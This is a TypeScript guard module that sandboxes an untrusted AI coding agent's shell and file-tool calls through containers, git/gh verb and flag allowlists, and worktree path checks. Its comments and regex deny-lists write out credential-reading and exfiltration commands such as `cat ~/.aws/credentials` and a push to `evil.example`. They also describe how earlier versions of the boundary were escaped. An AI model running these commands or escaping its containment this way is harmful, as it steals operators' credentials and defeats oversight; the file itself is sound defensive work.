/**
 * The agent's own shell, behind the boundary.
 *
 * Containing only the verification command is a narrowing, not a containment. The
 * dangerous half of resolving a ticket is the editing session: arbitrary shell,
 * arbitrary file writes, and dependency installs, all driven by an untrusted model.
 * A `npm install` mid-ticket runs whatever `postinstall` the dependency tree carries,
 * as the operator, with the operator's filesystem and network -- so it can read
 * `~/.aws/credentials` or any `.env` on the box and post it anywhere. That is routine
 * behaviour, not an exotic attack.
 *
 * The pre-tool guards cannot close this. They enumerate known-bad operations
 * (a push to a protected branch, a PR body that reads badly); anything not enumerated
 * runs. A denylist over tool arguments is policy, not a boundary.
 *
 * This guard uses the one thing a permission decision can do that a hook could not:
 * it returns *modified input*. A `Bash` call is rewritten on the way through so the
 * command executes inside the same container the verification step already uses --
 * the worktree as its only mount, no network, unprivileged, resource-capped. The
 * model is not denied and does not retry; the unsafe call simply stops being possible,
 * exactly as `subagent-tier` corrects a model rather than punishing it.
 *
 * ## Why the host-only decision is a parser and not a prefix match
 *
 * The first version of this guard tested `/^\s*(git|gh)\b/` and let the command through
 * to the host when it matched. An untrusted model chooses the first token, so it chose
 * whether it was contained: `git status && cat ~/.aws/credentials` matched on `git`, and
 * the entire compound -- credential read included -- ran on the host. A symmetrical hole
 * let `docker run -v /:/host --privileged ...` pass as "already contained".
 *
 * A boundary whose first token the attacker picks is not a boundary. So the decision is
 * now fail-closed in both directions: a command reaches the host only when it parses as a
 * single, metacharacter-free invocation of `git` or `gh`, and anything this module cannot
 * prove safe is contained rather than passed. Our own wrapped calls are recognised by an
 * out-of-band marker on the tool input, never by sniffing the string for `docker run`,
 * so a model-authored `docker run` can never self-exempt.
 *
 * ## Known cost of refusing quotes
 *
 * `git commit -m "fix the rounding bug"` contains a quote, so it is contained -- and a
 * contained `git` cannot reach the primary checkout's object store, so it fails rather
 * than silently committing somewhere unexpected. That is deliberate: a quoted string is
 * exactly where a second command hides, and this module does not implement a shell
 * parser it would have to get perfectly right. Runs should commit through the engine's
 * own commit path (or `-F` a message file inside the worktree, which needs no quotes).
 * The failure is loud and recoverable; the alternative is a parser bug that is neither.
 */
import { readSandboxConfig, sandboxCommand, type SandboxConfig } from '../../forge/sandbox-exec.ts';
import type { Guard, GuardDecision, ToolCall } from '../../types.ts';

/**
 * Shell syntax that makes a command more than one invocation, or that can reach the
 * filesystem and process table sideways. Any of these and the command is not a bare
 * `git`/`gh` call, whatever it starts with.
 *
 * Deliberately broad: a false "contain this" costs a container start, while a false
 * "run on the host" costs the operator's credentials.
 */
const SHELL_METACHARACTERS = /[;&|<>$`(){}\n\r\\!*?[\]~#]/;

/**
 * Arguments that redirect an allowlisted verb at something other than this worktree.
 *
 * The verb allowlist was still only half the decision: `log` is harmless, but
 * `git --git-dir=/c/dev/OtherRepo/.git log` reads a different repository entirely, and
 * `git --work-tree=/ ... checkout .` writes files anywhere the operator can. Worse,
 * `git push https://evil.example/x main` needs no dangerous verb at all -- `push` is
 * exactly the verb the workflow requires -- and sends the entire repository to an
 * attacker. Constraining the verb without constraining its arguments is the same
 * mistake one level down.
 *
 * So: no repository redirection, no remote that is not already configured, and no
 * absolute path. A ticket's work is done with relative paths inside its own worktree
 * and pushes to `origin`.
 */
const GIT_ARGUMENT_REFUSALS = [
  // Point git at another repository, or at another working tree.
  /(^|\s)--(git-dir|work-tree|namespace|bare|separate-git-dir)\b/i,
  /(^|\s)-C(\s|=)/,
  // Any explicit remote: a URL, an scp-style host, or a local path repository.
  /(^|\s)[a-z][a-z0-9+.-]*:\/\//i,
  /(^|\s)[\w.-]+@[\w.-]+:/,
  /(^|\s)(file|ssh|git|http|https|ftp):/i,
  // An absolute path, on either platform. Relative paths inside the worktree are the
  // only thing a ticket's own work needs.
  /(^|\s)\/[^\s]/,
  /(^|\s)[A-Za-z]:[\\/]/,
  // Arguments that name a PROGRAM for an otherwise-innocent verb to run. `git rebase
  // --exec <cmd>` runs its argument once per commit, and was demonstrated executing an
  // arbitrary program on the host EVEN WITH the hardening flags pinned -- a
  // command-line argument is not something a `-c` setting can neutralise. The same
  // shape appears on several allowlisted verbs, so it is refused by argument, not by
  // verb.
  /(^|\s)--exec\b/i,
  /(^|\s)-x(\s|=)/,
  /(^|\s)--(upload-pack|receive-pack|upload-archive)\b/i,
  /(^|\s)--ext-diff\b/i,
  /(^|\s)--edit-description\b/i,
  /(^|\s)--(directory|no-index)\b/i,
];

/**
 * The options each allowlisted verb may carry, as an ALLOWLIST.
 *
 * Round after round of this boundary was lost to the same shape: refuse `--exec-path`,
 * and `--exec` walks in; refuse `--exec`, and `--unsafe-paths` walks in; refuse that,
 * and `--output=` is next. A denylist of arguments can only ever block the flag that
 * was already used against it, and git has hundreds. So the argument decision is
 * inverted here: a flag this table does not name is refused, whether or not anyone has
 * thought of it yet.
 *
 * The sets are deliberately small -- what a ticket's own work needs, and nothing
 * speculative. A verb that needs a flag it does not have will be contained rather than
 * silently allowed, which is a loud, fixable failure. `GIT_ARGUMENT_REFUSALS` still
 * runs afterwards, because a flag can be allowlisted and still be pointed somewhere it
 * should not go (`--git-dir`, an absolute path, a URL remote).
 *
 * Bare `-` prefixed short flags are matched by their exact token, so `-m` is allowed
 * for `commit` while `-S` is not allowed for `blame`.
 */
const HOST_VERB_FLAGS: Record<string, Record<string, ReadonlySet<string>>> = {
  git: {
    status: new Set(['--short', '-s', '--porcelain', '--branch', '-b', '--untracked-files', '-u']),
    add: new Set(['--all', '-A', '--update', '-u', '--patch', '-p', '--force', '-f', '--intent-to-add', '-N', '.']),
    commit: new Set(['--message', '-m', '--all', '-a', '--amend', '--no-edit', '--file', '-F', '--allow-empty', '--fixup', '--squash']),
    diff: new Set(['--cached', '--staged', '--name-only', '--name-status', '--stat', '--shortstat', '--numstat', '--unified', '-U', '--word-diff', '--color', '--no-color', '-w', '--ignore-all-space']),
    log: new Set(['--oneline', '--graph', '--format', '--pretty', '--abbrev-commit', '--max-count', '-n', '--since', '--until', '--author', '--grep', '--name-only', '--name-status', '--stat', '--reverse', '--no-merges', '--first-parent', '--follow', '-p', '--patch']),
    show: new Set(['--stat', '--name-only', '--name-status', '--format', '--pretty', '--oneline', '--no-patch', '-s']),
    'rev-parse': new Set(['--abbrev-ref', '--short', '--verify', '--quiet', '-q', '--show-toplevel', '--git-path', '--is-inside-work-tree', '--symbolic-full-name']),
    branch: new Set(['--list', '-l', '--all', '-a', '--remotes', '-r', '--delete', '-d', '-D', '--move', '-m', '--show-current', '--contains', '--merged', '--no-merged', '--format', '--sort', '-v', '--verbose', '-f', '--force']),
    checkout: new Set(['-b', '-B', '--track', '-t', '--detach', '--force', '-f', '--ours', '--theirs', '--merge', '--patch', '-p', '--orphan', '.', '--']),
    switch: new Set(['--create', '-c', '--detach', '--force', '-f', '--track', '-t', '--merge', '--discard-changes']),
    restore: new Set(['--staged', '--worktree', '--source', '-s', '--patch', '-p', '.', '--']),
    stash: new Set(['push', 'pop', 'apply', 'list', 'show', 'drop', 'clear', '--include-untracked', '-u', '--keep-index', '--message', '-m']),
    fetch: new Set(['--all', '--prune', '-p', '--tags', '--depth', '--unshallow', '--no-tags', '--force', '-f', '--quiet', '-q']),
    pull: new Set(['--rebase', '--no-rebase', '--ff-only', '--no-ff', '--prune', '--quiet', '-q', '--autostash']),
    push: new Set(['--set-upstream', '-u', '--force-with-lease', '--force', '-f', '--tags', '--delete', '-d', '--dry-run', '-n', '--quiet', '-q', '--no-verify']),
    merge: new Set(['--no-ff', '--ff-only', '--squash', '--abort', '--continue', '--message', '-m', '--no-commit', '--strategy', '-s', '--strategy-option', '-X']),
    rebase: new Set(['--onto', '--continue', '--abort', '--skip', '--interactive', '-i', '--autostash', '--no-autostash', '--quiet', '-q', '--strategy', '-s', '--strategy-option', '-X']),
    reset: new Set(['--hard', '--soft', '--mixed', '--merge', '--keep', '--quiet', '-q', '.', '--']),
    tag: new Set(['--list', '-l', '--annotate', '-a', '--message', '-m', '--delete', '-d', '--force', '-f', '--sort', '--format', '--contains']),
    describe: new Set(['--tags', '--always', '--abbrev', '--long', '--dirty', '--match', '--exclude']),
    blame: new Set(['--line-porcelain', '--porcelain', '-L', '--show-name', '-f', '--show-number', '-n', '-w']),
    'ls-files': new Set(['--cached', '--deleted', '--modified', '--others', '-o', '--ignored', '-i', '--stage', '-s', '--exclude-standard', '-z', '--error-unmatch']),
    'merge-base': new Set(['--is-ancestor', '--fork-point', '--octopus', '--all', '-a']),
    'cherry-pick': new Set(['--continue', '--abort', '--skip', '--no-commit', '-n', '--mainline', '-m', '--edit', '-e', '--signoff', '-s']),
    revert: new Set(['--continue', '--abort', '--skip', '--no-commit', '-n', '--mainline', '-m', '--no-edit']),
    apply: new Set(['--check', '--stat', '--summary', '--index', '--cached', '--reverse', '-R', '--3way', '-3', '--whitespace', '--exclude', '--include', '-p']),
    'ls-remote': new Set(['--heads', '-h', '--tags', '-t', '--refs', '--exit-code', '--quiet', '-q']),
    shortlog: new Set(['--summary', '-s', '--numbered', '-n', '--email', '-e', '--format', '--no-merges']),
    'name-rev': new Set(['--tags', '--name-only', '--always', '--refs', '--stdin']),
  },
  gh: {
    pr: new Set(['create', 'view', 'list', 'diff', 'edit', 'comment', 'checkout', 'checks', 'ready', 'close', 'reopen', 'status', 'merge', '--draft', '--title', '-t', '--body', '-b', '--body-file', '-F', '--base', '-B', '--head', '-H', '--repo', '-R', '--json', '--jq', '-q', '--state', '-s', '--limit', '-L', '--web', '-w', '--label', '-l', '--assignee', '-a', '--reviewer', '-r', '--fill', '--search']),
    issue: new Set(['create', 'view', 'list', 'edit', 'comment', 'close', 'reopen', 'status', 'develop', '--title', '-t', '--body', '-b', '--body-file', '-F', '--repo', '-R', '--json', '--jq', '-q', '--state', '-s', '--limit', '-L', '--web', '-w', '--label', '-l', '--assignee', '-a', '--search', '--milestone', '-m']),
    repo: new Set(['view', 'list', 'clone', 'create', 'edit', 'sync', '--repo', '-R', '--json', '--jq', '-q', '--limit', '-L', '--web', '-w']),
    run: new Set(['list', 'view', 'watch', 'rerun', 'cancel', 'download', '--repo', '-R', '--json', '--jq', '-q', '--limit', '-L', '--workflow', '-w', '--branch', '-b', '--status', '-s', '--log', '--log-failed']),
    release: new Set(['list', 'view', 'create', 'edit', 'delete', 'download', 'upload', '--repo', '-R', '--json', '--jq', '-q', '--limit', '-L', '--title', '-t', '--notes', '-n', '--notes-file', '-F', '--draft', '-d', '--prerelease', '-p']),
    label: new Set(['list', 'create', 'edit', 'delete', 'clone', '--repo', '-R', '--json', '--jq', '-q', '--limit', '-L', '--color', '-c', '--description', '-d']),
  },
};

/**
 * The only subcommands a host-side `git`/`gh` may use.
 *
 * Allowing a whole binary is allowing its least safe verb. `gh auth token` prints the
 * operator's OAuth token straight into the model's transcript -- defeating the
 * container's headline property without touching the container -- and `git clone`
 * writes wherever its second argument points. Proving a command is "one bare
 * invocation of git" proves its SHAPE, not its SAFETY; only an allowlist of verbs
 * whose job is to move this ticket's work along can do that.
 *
 * Deliberately excluded and worth naming: git `config` (writes the trap a later
 * innocent command triggers), `clone`/`submodule` (fetch and write outside the
 * worktree), `daemon`/`filter-branch`; gh `auth` (credentials), `api` (arbitrary
 * request with the operator's token), `secret`, `codespace`, `extension`, `alias`.
 */
const HOST_SUBCOMMANDS: Record<string, ReadonlySet<string>> = {
  git: new Set([
    'status', 'add', 'commit', 'diff', 'log', 'show', 'rev-parse', 'branch',
    'checkout', 'switch', 'restore', 'stash', 'fetch', 'pull', 'push', 'merge',
    'rebase', 'reset', 'tag', 'describe', 'blame', 'ls-files', 'merge-base',
    'cherry-pick', 'revert', 'apply', 'ls-remote', 'shortlog', 'name-rev',
  ]),
  gh: new Set(['pr', 'issue', 'repo', 'run', 'release', 'label']),
};

/** Host-only executables. Anything else is contained. */
const HOST_ONLY_COMMANDS = new Set(['git', 'gh']);

/**
 * `git` and `gh` options that turn them into general-purpose execution engines.
 *
 * Allowing "a bare git" is not the same as allowing something safe. git is
 * programmable, and several of its options name a program it will then run -- with no
 * shell metacharacter anywhere, so the metacharacter parser above sees nothing wrong.
 * Demonstrated on this machine: `git -c core.hooksPath=.hk commit -m probe` executed
 * an attacker-supplied `.hk/pre-commit` on the HOST, from a command that is, by every
 * syntactic measure, a plain `git` invocation.
 *
 * `--exec-path` relocates git's own helper binaries; `core.pager`/`GIT_PAGER` and
 * `core.editor` name programs; `alias.*` bodies beginning `!` are shell; `ext::`
 * remotes execute their argument; and `config` can write any of these into the repo
 * for a later, innocent-looking command to trigger.
 */
const GIT_EXECUTION_OPTIONS = [
  /(^|\s)--exec-path\b/i,
  /(^|\s)--upload-pack\b/i,
  /(^|\s)--receive-pack\b/i,
  /(^|\s)-c\s+\S*(hookspath|pager|editor|alias\.|sshcommand|askpass|helper|externaldiff|protocol\.)/i,
  /(^|\s)-c\s+core\.fsmonitor/i,
  /(^|\s)config\b/i,
  /ext::/i,
  /(^|\s)--config-env\b/i,
];

/**
 * gh options that redirect it at an attacker's server or run a program.
 * `--hostname` points the API elsewhere; `gh alias` and `gh extension` install and run
 * arbitrary code.
 */
const GH_EXECUTION_OPTIONS = [
  /(^|\s)--hostname\b/i,
  /(^|\s)(alias|extension|ext)\b/i,
];

/**
 * Marks a command this module already wrapped, so a re-entrant call is not double
 * wrapped. It rides on the tool input rather than being sniffed out of the command
 * string: a marker the model cannot forge, where `/docker\s+run/` was one it could.
 */
export const CONTAINED_MARKER = '__forgeContained';

/**
 * True only for a command this module can prove is a single bare `git`/`gh` invocation.
 *
 * `git` is the boundary's own seam: the worktree's `.git` is a file pointing at the
 * primary checkout's object store, which is deliberately unreachable from inside the
 * container, so a contained `git` call cannot work. Committing and pushing are also
 * precisely what `gitflow`/`readability` already guard, and moving them inside would
 * blind those guards while gaining nothing -- the payload risk is the code being run,
 * not the commit being made.
 *
 * Everything about this function is fail-closed: it returns false whenever it is unsure.
 */
export function isBareHostCommand(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed) return false;
  // One metacharacter anywhere and this is not a single invocation we can reason about.
  if (SHELL_METACHARACTERS.test(trimmed)) return false;
  // Quotes can hide a second command from a naive split; refuse rather than parse them.
  if (/['"]/.test(trimmed)) return false;

  const [head] = trimmed.split(/\s+/);
  if (!head) return false;
  // A path-qualified `/usr/bin/git` or `..\git.exe` is not the plain name we allow.
  if (/[/\\]/.test(head)) return false;
  const name = head.toLowerCase();
  if (!HOST_ONLY_COMMANDS.has(name)) return false;

  // Being `git` is not enough: git is programmable, and these options name a program
  // for it to run on the host, with no metacharacter for the parser above to catch.
  const executionOptions = name === 'git' ? GIT_EXECUTION_OPTIONS : GH_EXECUTION_OPTIONS;
  if (executionOptions.some((pattern) => pattern.test(trimmed))) return false;

  // Nor is being a well-formed `git` invocation: the verb decides what it does.
  // Skip leading global flags to find it, and refuse if the verb is not allowlisted.
  const tokens = trimmed.split(/\s+/).slice(1);
  const subcommand = tokens.find((token) => !token.startsWith('-'));
  if (!subcommand) return false;
  if (!(HOST_SUBCOMMANDS[name]?.has(subcommand.toLowerCase()) ?? false)) return false;

  // And an allowlisted verb still has to be pointed at this worktree: `push` is
  // required by the workflow and sends the whole repository wherever it is told.
  if (name === 'git' && GIT_ARGUMENT_REFUSALS.some((pattern) => pattern.test(trimmed))) {
    return false;
  }

  // Finally, every flag the verb carries must be one this verb is allowed to carry.
  // This is an allowlist because the denylist above can only ever block the flag that
  // was already used against it: --exec-path, then --exec, then --unsafe-paths, then
  // --output=. A flag nobody has thought of yet is refused by default.
  const verbFlags = HOST_VERB_FLAGS[name]?.[subcommand.toLowerCase()];
  if (!verbFlags) return false;
  for (const token of tokens) {
    if (token === subcommand || !token.startsWith('-')) continue;
    // `-5` on `log` is git's shorthand for `--max-count=5`, and `-1` is ubiquitous.
    // A bare numeric flag names no program and reaches nothing, so it is allowed
    // wherever the verb already accepts a count.
    if (/^-\d+$/.test(token)) continue;
    // A bundled short form -- `-am` for `-a -m` -- is checked letter by letter, or an
    // ordinary `git commit -am wip` would be refused for a flag it does not contain.
    if (/^-[A-Za-z]{2,}$/.test(token)) {
      const letters = token.slice(1).split('');
      if (letters.every((letter) => verbFlags.has(`-${letter}`))) continue;
      return false;
    }
    // `--flag=value` is allowed by its flag name; the value is judged by the refusals
    // above (absolute path, URL remote) rather than by this table.
    const flagName = token.split('=')[0] ?? token;
    if (!verbFlags.has(flagName)) return false;
  }
  return true;
}

/**
 * Wraps one argv element so a host shell treats it as a single opaque word.
 *
 * This is the difference between a boundary and an injection primitive. The Bash tool
 * takes a command *string*, so the container argv has to be flattened to be handed
 * over -- and a naive `argv.join(' ')` puts the model's own command back into a host
 * shell unquoted. `npm ci; cat ~/.aws/credentials` then splits at the `;`: the
 * container receives only `npm`, and the credential read executes on the HOST, while
 * the journal records the call as contained. `$(...)` is worse still, because the host
 * shell expands it while parsing, so the payload fires before docker is even invoked.
 *
 * Single quotes are the only POSIX construct that suppresses every metacharacter, and
 * the embedded-quote case is closed the standard way: end the quote, emit an escaped
 * `'`, reopen. The empty string must still produce `''` or it would vanish from argv.
 */
export function shellQuote(argument: string): string {
  if (argument === '') return "''";
  // Nothing to do for a word that is already inert under any shell.
  if (/^[A-Za-z0-9_@%+=:,./-]+$/.test(argument)) return argument;
  return `'${argument.replace(/'/g, `'\\''`)}'`;
}

/**
 * Tools that name a host path, and the input fields each may carry it in.
 *
 * Enumerating the *writing* tools was not enough: `Grep` with `path: C:/Users/aaron/.aws`
 * or a `Glob` reads host files outside the worktree, passes through no shell, and so
 * met no container and no path check. Any tool that can name a path belongs here, and
 * the fallthrough below treats an unknown path-bearing field as something to check
 * rather than something to wave through.
 */
const FILE_TOOL_PATHS: Record<string, readonly string[]> = {
  Write: ['file_path'],
  Edit: ['file_path'],
  MultiEdit: ['file_path'],
  NotebookEdit: ['notebook_path'],
  NotebookRead: ['notebook_path'],
  Read: ['file_path'],
  Grep: ['path'],
  Glob: ['path'],
  LS: ['path'],
};

/**
 * Input fields that name a path on any tool, checked even when the tool is unknown.
 *
 * A boundary that only knows today's tool names silently reopens the moment one is
 * added. This is the deny-by-default half: an unrecognised tool carrying `file_path`
 * is confined exactly as `Write` would be.
 */
const PATH_FIELDS = ['file_path', 'notebook_path', 'path'] as const;

/**
 * True when a file tool's target lies inside the worktree it is allowed to touch.
 *
 * The container confines what a command can REACH. It cannot confine the SDK's own
 * file tools, because those are executed by the harness rather than by a shell -- so
 * `Write` to `C:/Users/aaron/.aws/credentials`, or `Read` of an `.env` two directories
 * up, never passes through any container at all. Containing Bash while leaving these
 * open would be a boundary with a door in it.
 *
 * Fail-closed: a path this cannot resolve, or that escapes the worktree by any route
 * (`..`, an absolute path elsewhere, a different drive), is refused.
 */
export function isPathInsideWorktree(rawPath: string, worktree: string): boolean {
  if (typeof rawPath !== 'string' || !rawPath.trim()) return false;

  const norm = (value: string) => value.replace(/\\/g, '/').replace(/\/+$/, '').toLowerCase();
  const root = norm(worktree);
  const target = norm(rawPath);

  // A relative path is resolved against the worktree, which is the tool's own cwd.
  const absolute = /^([a-z]:\/|\/)/.test(target) ? target : `${root}/${target}`;
  // A POSIX root ("/repo") must keep its leading slash through the segment walk below,
  // or it can never match the root it came from.
  const leading = absolute.startsWith('/') ? '/' : '';

  // Resolve `.` and `..` textually rather than touching the filesystem: the decision
  // must not depend on whether the file exists yet.
  const parts: string[] = [];
  for (const segment of absolute.split('/')) {
    if (segment === '.' || segment === '') continue;
    if (segment === '..') {
      if (!parts.length) return false;
      parts.pop();
      continue;
    }
    parts.push(segment);
  }
  const resolved = leading + parts.join('/');
  return resolved === root || resolved.startsWith(`${root}/`);
}

/**
 * Environment that neutralises a hostile git configuration for a host-side call.
 *
 * The subcommand allowlist stops the model asking git to run a program *now*. It does
 * not stop a trap laid *earlier*: the model may legitimately write inside its own
 * worktree, and `<worktree>/.git/config` or a `.forge-hooks/pre-commit` it authored
 * would then fire on the next perfectly ordinary `git commit`. Config precedence is
 * the lever -- an explicit `-c` on the command line beats any file -- so every
 * program-naming setting is pinned to something inert, and the global and system
 * config files are taken out of the picture entirely.
 *
 * This is the half that makes the allowlist mean anything, because it closes the path
 * that runs through commands the allowlist has to permit.
 */
export const HOST_GIT_ENV: Readonly<Record<string, string>> = {
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_SYSTEM: '/dev/null',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_TERMINAL_PROMPT: '0',
  GIT_ASKPASS: '',
  GIT_SSH_COMMAND: '',
};

/** Config pinned on the command line, where it outranks any file the model wrote. */
export const HOST_GIT_ARGS: readonly string[] = [
  '-c', 'core.hooksPath=/dev/null',
  '-c', 'core.fsmonitor=false',
  '-c', 'core.pager=cat',
  '-c', 'core.editor=true',
  '-c', 'protocol.ext.allow=never',
];

/**
 * Rewrites a host-side `git` call so a repository-local trap cannot fire.
 *
 * `gh` is returned unchanged: it takes no `-c`, and its own dangerous verbs are
 * already refused by the subcommand allowlist.
 */
export function hardenHostCommand(command: string): string {
  const trimmed = command.trim();
  if (!/^git(\s|$)/i.test(trimmed)) return trimmed;
  return `git ${HOST_GIT_ARGS.join(' ')} ${trimmed.slice(3).trim()}`.trim();
}

export interface ShellContainmentOptions {
  /** The worktree the agent is working in: the only host path the command may reach. */
  cwd: string;
  /** Defaults to `readSandboxConfig()`. Injected so a specimen needs no runtime. */
  config?: SandboxConfig;
  /** Names the container per call, so a sweep can reap it. */
  nameFor?: (index: number) => string;
}

export function createShellContainmentGuard(options: ShellContainmentOptions): Guard {
  const config = options.config ?? readSandboxConfig();
  let index = 0;

  return {
    name: 'shell-containment',

    decide(call: ToolCall): GuardDecision {
      if (!config.enabled) return { kind: 'pass' };

      // The SDK's file tools never pass through a shell, so no container sees them.
      // Confine them to the worktree by path instead, or the Bash boundary has a door.
      // Unknown tools are checked too, by field name, so adding a tool cannot silently
      // reopen the boundary.
      const fields = FILE_TOOL_PATHS[call.toolName] ?? PATH_FIELDS;
      for (const field of fields) {
        const target = call.input?.[field];
        if (typeof target !== 'string' || !target.trim()) continue;
        if (isPathInsideWorktree(target, options.cwd)) continue;
        return {
          kind: 'deny',
          reason: `refusing ${call.toolName} outside the ticket worktree: ${target}. `
            + 'The agent may only read and write inside the worktree it was given.',
        };
      }
      if (FILE_TOOL_PATHS[call.toolName]) return { kind: 'pass' };

      if (call.toolName !== 'Bash') return { kind: 'pass' };

      const command = call.input?.['command'];
      if (typeof command !== 'string' || !command.trim()) return { kind: 'pass' };
      // Our own marker, not a pattern in the string the model wrote.
      if (call.input?.[CONTAINED_MARKER] === true) return { kind: 'pass' };
      if (isBareHostCommand(command)) {
        // Allowed on the host, but never with the model's own git configuration: a
        // hook or `.git/config` it wrote inside its worktree would otherwise fire on
        // the next ordinary `git commit`. Pinned `-c` flags outrank any config file.
        const hardened = hardenHostCommand(command);
        if (hardened === command) return { kind: 'pass' };
        return {
          kind: 'modify',
          input: { ...call.input, command: hardened, [CONTAINED_MARKER]: true },
          note: 'host git hardened: hooks, pager, editor and fsmonitor pinned inert',
        };
      }

      const name = options.nameFor?.(index) ?? `forge-shell-${index}`;
      index += 1;
      const boxed = sandboxCommand(config, { command, cwd: options.cwd, name });
      if (!boxed.contained) {
        // Containment was expected and could not be built. The verify path already
        // refuses to claim a verdict it cannot prove; the edit path must not quietly
        // hand an untrusted command to the host either.
        return {
          kind: 'deny',
          reason: 'refusing to run on the host: shell containment was expected but could '
            + 'not be constructed. Set FORGE_SANDBOX=0 to opt out deliberately.',
        };
      }

      return {
        kind: 'modify',
        // Quoted, not joined. A bare `argv.join(' ')` would hand the model's own
        // metacharacters back to the host shell that runs this string, so the
        // contain branch would itself become the escape it was built to prevent.
        input: {
          ...call.input,
          command: boxed.argv.map(shellQuote).join(' '),
          [CONTAINED_MARKER]: true,
        },
        note: `shell contained: ${name} (${config.image}, network=${config.network})`,
      };
    },
  };
}
